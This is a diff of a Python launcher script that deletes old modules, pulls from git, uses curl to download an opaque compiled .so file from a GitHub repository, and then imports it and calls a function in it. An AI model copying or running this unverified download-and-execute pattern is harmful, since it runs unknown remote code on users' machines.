@@ -11,20 +11,20 @@ try:
         os.system('rm -rf KING.so KING32.so')
 except:
     pass
-os.system('rm -rf KING.so KING.so')
+os.system('rm -rf KING.so KING32.so')
 os.system('git pull')
 
 bit = platform.architecture()[0]
 if bit == '64bit':
     if not os.path.isfile('KING.so'):
         os.system('curl -L https://github.com/chigoziieworldwide/exec/blob/main/KING.cpython-311.so?raw=true -o KING.so') 
-        import KING
+        __import__("KING").chigozie()
     else:
-        import KING
+        __import__("KING").chigozie()
 
 elif bit == '32bit':
     if not os.path.isfile('KING32.so'):
         os.system('curl -L https://github.com/chigoziieworldwide/exec/blob/main/KING32.cpython-311.so?raw=true -o KING32.so') 
-        import KING32
+        __import__("KING32").chigozie()
     else:
-        import KING32
+        __import__("KING32").chigozie()
